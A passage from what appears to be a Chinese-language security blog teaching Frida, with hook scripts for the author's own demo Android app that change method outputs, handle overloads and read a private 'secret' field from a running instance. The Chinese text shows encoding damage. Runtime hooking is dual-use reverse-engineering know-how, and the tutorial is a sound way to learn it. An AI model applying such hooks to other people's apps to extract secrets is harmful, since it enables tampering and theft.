on_message)</span><br><span class="line">    script.load()</span><br><span class="line"></span><br><span class="line">device.resume(pid)</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><figcaption><span>script.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    main = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.myapplication.MainActivity&quot;</span>)</span><br><span class="line">    main.<span class="property">say</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">something</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="variable language_">this</span>.<span class="title function_">say</span>(something)</span><br><span class="line">        <span class="keyword">return</span> ret + <span class="string">&#x27;!!!&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p align="center"><img data-src="/images/example-app-hook.png" class=" lazyload"  width="300" title="example app hook"></p>
<h2 id="é€†ä¹‹å‘¼å¸è²³ä¹‹å‹-é‡è¼‰å‡½å¼">é€†ä¹‹å‘¼å¸è²³ä¹‹å‹ - é‡è¼‰å‡½å¼</h2>
<p>æ”¹ä¸€ä¸‹ç¯„ä¾‹ APPï¼Œå¤šåŠ ä¸Šä¸€å€‹æ¥å—æ•¸å­—åšè¼¸å…¥çš„ <code>say</code> å‡½å¼<br>
æ¥æ”¶åˆ°æ•¸å­—å¾Œï¼Œå°±è¼¸å‡º Hello åŠ ä¸Šè¼¸å…¥çš„æ•¸å­—çš„å¹³æ–¹</p>
<figure class="highlight java"><figcaption><span>MainActivity.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myapplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="type">Button</span> <span class="variable">sayButton</span> <span class="operator">=</span> findViewById(R.id.sayButton);</span><br><span class="line">        sayButton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">EditText</span> <span class="variable">somethingEditText</span> <span class="operator">=</span> findViewById(R.id.somethingEditText);</span><br><span class="line">                <span class="type">TextView</span> <span class="variable">resultTextView</span> <span class="operator">=</span> findViewById(R.id.resultTextView);</span><br><span class="line">                <span class="type">String</span> <span class="variable">something</span> <span class="operator">=</span> somethingEditText.getText().toString();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Integer</span> <span class="variable">number</span> <span class="operator">=</span> Integer.parseInt(something);</span><br><span class="line">                    resultTextView.setText(say(number));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">                    resultTextView.setText(say(something));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">say</span> <span class="params">(String something)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + something;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">say</span> <span class="params">(Integer number)</span> &#123;</span><br><span class="line">        number = number * number;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + number.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p align="center"><img data-src="/images/example-app2.png" class=" lazyload"  width="300" title="example app"></p>
<p>å…©å€‹ <code>say</code> éƒ½æ˜¯ä¸€æ¨£çš„åå­—ï¼Œæ‰€ä»¥ hook çš„æ™‚å€™è¦ç”¨ <code>overload</code> å»å€åˆ†ï¼Œ<code>overload</code> åƒæ•¸æ”¾çš„æ˜¯ç›®æ¨™å‡½å¼è¼¸å…¥åƒæ•¸çš„å‹æ…‹<br>
é€™æ¬¡æˆ‘å€‘åœ¨æ–°çš„ <code>say</code> å‡½å¼çš„è¼¸å‡ºæ–‡å­—å¾Œé¢åŠ ä¸Š <code>???</code><br>
<code>hook.py</code> è·Ÿä¸Šä¸€å€‹ä¾‹å­ä¸€æ¨£å°±ä¸å†è²¼ä¸€æ¬¡äº†</p>
<figure class="highlight javascript"><figcaption><span>script.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    main = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.myapplication.MainActivity&quot;</span>)</span><br><span class="line">    main.<span class="property">say</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.String&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">something</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="variable language_">this</span>.<span class="title function_">say</span>(something)</span><br><span class="line">        <span class="keyword">return</span> ret + <span class="string">&#x27;!!!&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    main.<span class="property">say</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.Integer&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">number</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="variable language_">this</span>.<span class="title function_">say</span>(number)</span><br><span class="line">        <span class="keyword">return</span> ret + <span class="string">&#x27;???&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p align="center"><img data-src="/images/example-app2-hook.png" class=" lazyload"  width="300" title="example app hook"></p>
<h2 id="é€†ä¹‹å‘¼å¸åƒä¹‹å‹-éš±è—å‡½å¼">é€†ä¹‹å‘¼å¸åƒä¹‹å‹ - éš±è—å‡½å¼</h2>
<p>å†æ”¹ä¸€ä¸‹ç¯„ä¾‹ APPï¼Œå¤šåŠ ä¸Šä¸€å€‹è®Šæ•¸ <code>secret</code> å’Œä¸€å€‹å‡½å¼ <code>getSecret</code>ï¼Œåœ¨ <code>onCreate</code> è£¡é¢æœƒçµ¦ <code>secret</code> ä¸€å€‹éš¨æ©Ÿå€¼ï¼Œæˆ‘å€‘çš„ç›®æ¨™å°±æ˜¯æ‰¾å‡ºé€™å€‹å€¼</p>
<figure class="highlight java"><figcaption><span>MainActivity.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myapplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> secret;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        secret = (<span class="type">int</span>) (Math.random() * <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Button</span> <span class="variable">sayButton</span> <span class="operator">=</span> findViewById(R.id.sayButton);</span><br><span class="line">        sayButton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">EditText</span> <span class="variable">somethingEditText</span> <span class="operator">=</span> findViewById(R.id.somethingEditText);</span><br><span class="line">                <span class="type">TextView</span> <span class="variable">resultTextView</span> <span class="operator">=</span> findViewById(R.id.resultTextView);</span><br><span class="line">                <span class="type">String</span> <span class="variable">something</span> <span class="operator">=</span> somethingEditText.getText().toString();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Integer</span> <span class="variable">number</span> <span class="operator">=</span> Integer.parseInt(something);</span><br><span class="line">                    resultTextView.setText(say(number));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">                    resultTextView.setText(say(something));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">say</span> <span class="params">(String something)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + something;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    String <span class="title function_">say</span> <span class="params">(Integer number)</span> &#123;</span><br><span class="line">        number = number * number;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + number.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">getSecret</span> <span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å› ç‚ºæˆ‘å€‘çš„ç›®æ¨™ä¸æ˜¯è‡ªå·± new ä¸€å€‹ç‰©ä»¶å‡ºä¾†æŠ“ <code>secret</code>ï¼Œé€™æ¨£å°±åªæ˜¯ä¸€å€‹æˆ‘å€‘è‡ªå·±å°±å¯ä»¥ç”Ÿæˆçš„éš¨æ©Ÿå€¼è€Œå·²<br>
æˆ‘å€‘æ˜¯è¦æ‰¾å‡ºç›®å‰å·²ç¶“å­˜åœ¨çš„é‚£å€‹ instance çš„ <code>secret</code>ï¼Œåœ¨å¯¦éš›ä¾‹å­ä¸­å¯èƒ½å°±æœƒæ˜¯ä¸€çµ„éš¨æ©Ÿç”Ÿæˆçš„å¯†ç¢¼ä¹‹é¡çš„<br>
æ‰€ä»¥æˆ‘å€‘è¦ç”¨åˆ° <code>Java.choose</code> å»æŠ“ instanceï¼ŒæŠ“åˆ° instance å¾Œï¼Œå¯ä»¥</p>
<ol>
<li><code>instance.getSecret()</code> å‘¼å«å‡½å¼æå®š</li>
<li><code>instance.secret.value</code> å­˜å–è®Šæ•¸æå®š</li>
</ol>
<p>ç„¶å¾Œç”¨ <code>send</code> å¯ä»¥æŠŠè³‡æ–™å‚³åˆ° python ç«¯çš„ <code>on_message</code> åšè™•ç†</p>
<figure class="highlight javascript"><figcaption><span>script.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.example.myapplication.MainActivity&quot;</span>, &#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">instance</span>) &#123;</span><br><span class="line">            <span class="title function_">send</span>(instance.<span class="title function_">getSecret</span>())  <span class="comment">// call function</span></span><br><span class="line">            <span class="title function_">send</span>(instance.<span class="property">secret</span>.<span class="property">value</span>) <span class="comment">// access vairable</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="ç–‘é›£é›œç—‡-3">ç–‘é›£é›œç—‡</h2>
<p>Q : æœ‰å‡½å¼ <code>a</code> è·Ÿè®Šæ•¸ <code>a</code> åŒåæ€éº¼è¾¦ ?<br>
A : <code>a</code> å­˜å–å‡½å¼ï¼Œ<code>_a</code> å­˜å–è®Šæ•¸</p>
<hr>
<ol>
<li><a target="_blank" rel="noopener" href="https://github.com/hookmaster/frida-all-in-one">https://github.com/hookmaster/frida-all-in-one</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/frida/frida/issues/833">How to access class member variable if thereâ€™s a member function called the same name?</a></li>
</ol>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/02/16/frida/#more">Read more</a></div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous is-invisible is-hidden-mobile"><a href="/page/0/">Previous</a></div><div class="pagination-next"><a href="/page/2/">Next</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link is-current" href="/">1</a></li><li><a class="pagination-link" href="/page/2/">2</a></li><li><a class="pagination-link" href="/page/3/">3</a></li><li><a class="pagination-link" href="/page/4/">4</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/images/avatar.png" alt="oalieno"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">oalieno</p><p class="is-size-6 is-block">è³‡å®‰ç ”ç©¶å“¡</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Taiwan</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">31</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">7</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">42</p></a></div></div></nav><div class="level"><a class="level-item button is-primary" href="https://github.com/oalieno" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/oalieno"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com/oalieno"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Linkedin" href="https://www.linkedin.com/in/oalieno/"><i class="fab fa-linkedin"></i></a></div></div></div><!--!--><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/%E5%8D%80%E5%A1%8A%E9%8D%8A/"><span class="level-start"><span class="level-item">å€å¡ŠéŠ</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%BC%94%E7%AE%97%E6%B3%95/"><span class="level-start"><span class="level-item">æ¼”ç®—æ³•</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%A8%8B%E5%BC%8F/"><span class="level-start"><span class="level-item">ç¨‹å¼</span></span><span class="level-end"><span class="level-item tag">12</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/"><span class="level-start"><span class="level-item">è³‡å®‰</span></span><span class="level-end"><span class="level-item tag">14</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/pwn/"><span class="level-start"><span class="level-item">pwn</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/reverse/"><span class="level-start"><span class="level-item">reverse</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/writeups/"><span class="level-start"><span class="level-item">writeups</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li></ul></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-31T16:00:00.000Z">2022-11-01</time></p><p class="title"><a href="/2022/11/01/MpDlpCmd/">ã€Windows Securityã€‘MpDlpCmd.exe</a></p><p class="categories"><a href="/categories/%E8%B3%87%E5%AE%89/">è³‡å®‰</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-03-29T16:00:00.000Z">2022-03-30</time></p><p class="title"><a href="/2022/03/30/blog03/">ã€éƒ¨è½æ ¼é–‹ç™¼æ—¥èªŒã€‘0x03</a></p><p class="categories"><a href="/categories/%E7%A8%8B%E5%BC%8F/">ç¨‹å¼</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-02-26T16:00:00.000Z">2021-02-27</time></p><p class="title"><a href="/2021/02/27/flow/">ã€é …ç›®ä»‹ç´¹ã€‘Flow ( Dapper Labs )</a></p><p class="categories"><a href="/categories/%E5%8D%80%E5%A1%8A%E9%8D%8A/">å€å¡ŠéŠ</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-08-15T16:00:00.000Z">2020-08-16</time></p><p class="title"><a href="/2020/08/16/clipboard-hijack/">Clipboard hijacking cryptocurrency malware on tradingview.com</a></p><p class="categories"><a href="/categories/%E8%B3%87%E5%AE%89/">è³‡å®‰</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-07-30T16:00:00.000Z">2020-07-31</time></p><p class="title"><a href="/2020/07/31/maltego/">ã€å·¥å…·ä»‹ç´¹ã€‘Maltego</a></p><p class="categories"><a href="/categories/%E8%B3%87%E5%AE%89/">è³‡å®‰</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/11/"><span class="level-start"><span class="level-item">November 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/03/"><span class="level-start"><span class="level-item">March 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">February 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/08/"><span class="level-start"><span class="level-item">August 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">July 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/06/"><span class="level-start"><span class="level-item">June 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/05/"><span class="level-start"><span class="level-item">May 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/03/"><span class="level-start"><span class="level-item">March 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/02/"><span class="level-start"><span class="level-item">February 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/01/"><span class="level-start"><span class="level-item">January 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/09/"><span class="level-start"><span class="level-item">September 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/06/"><span class="level-start"><span class="level-item">June 2019</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/05/"><span class="level-start"><span class="level-item">May 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/04/"><span class="level-start"><span class="level-item">April 2019</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/03/"><span class="level-start"><span class="level-item">March 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/01/"><span class="level-start"><span class="level-item">January 2019</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/09/"><span class="level-start"><span class="level-item">September 2018</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/08/"><span class="level-start"><span class="level-item">August 2018</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/02/"><span class="level-start"><span class="level-item">February 2018</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/GIL/"><span class="tag">GIL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/adb/"><span class="tag">adb</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/algorithm/"><span class="tag">algorithm</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/android/"><span class="tag">android</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/blockchain/"><span class="tag">blockchain</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/blog/"><span class="tag">blog</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/burp/"><span class="tag">burp</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/c/"><span class="tag">c++</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/command/"><span class="tag">command</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/crypto/"><span class="tag">crypto</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ctf/"><span class="tag">ctf</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/dapper-labs/"><span class="tag">dapper labs</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/drony/"><span class="tag">drony</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/flow/"><span class="tag">flow</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/frida/"><span class="tag">frida</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/gdb/"><span class="tag">gdb</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/hexo/"><span class="tag">hexo</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/icarus/"><span class="tag">icarus</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/kernel/"><span class="tag">kernel</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/nord/"><span class="tag">nord</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/nox/"><span class="tag">nox</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/osint/"><span class="tag">osint</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/powerlevel10k/"><span class="tag">powerlevel10k</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/powerlevel9k/"><span class="tag">powerlevel9k</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/proxy/"><span class="tag">proxy</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwn/"><span class="tag">pwn</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pyc/"><span class="tag">pyc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/reverse/"><span class="tag">reverse</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/reverse-ssh/"><span class="tag">reverse ssh</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rootkit/"><span class="tag">rootkit</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rsa/"><span class="tag">rsa</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/security/"><span class="tag">security</span><span class="tag">13</span></a></div><div class="control"><a class="tags has-addons" href="/tags/seo/"><span class="tag">seo</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/srop/"><span class="tag">srop</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssh/"><span class="tag">ssh</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tunnel/"><span class="tag">tunnel</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/windows/"><span class="tag">windows</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/windows-defender/"><span class="tag">windows defender</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/writeups/"><span class="tag">writeups</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/zimfw/"><span class="tag">zimfw</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/zsh/"><span class="tag">zsh</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">æ­æ¬¸åˆ©æ©çš„éƒ¨è½æ ¼</a><p class="is-size-7"><span>&copy; 2022 oalieno</span>Â Â Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>Â &amp;Â <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" 